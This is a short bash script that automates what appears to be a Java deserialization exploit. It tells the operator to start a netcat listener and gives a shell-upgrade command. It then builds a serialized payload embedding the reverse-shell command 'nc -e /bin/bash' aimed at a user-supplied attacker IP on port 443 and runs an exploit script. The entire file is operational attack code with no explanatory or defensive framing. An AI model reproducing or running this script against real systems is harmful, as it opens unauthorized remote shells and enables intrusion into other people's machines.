#! /bin/bash 

echo
echo "*******************************************************************"
echo
echo "Open another terminal window and run a netcat listener: nc -lvp 443"
echo
echo "Run the following command  to spawn a shell once the reverse connection establishes:"
echo 
echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" 
echo
read -n 1 -s -r -p "Once the above is complete - press any key to continue"

echo
echo "Enter Attacker IP Address:"
echo

read attacker

echo "Creating Payload with IP address" $attacker
echo

java -jar payload.jar payload.ser "nc -e /bin/bash $attacker 443" 

echo "Payload successfully created and saved as 'payload.ser'"
echo 

echo "Executing exploit..."
echo

python3 exploit.py
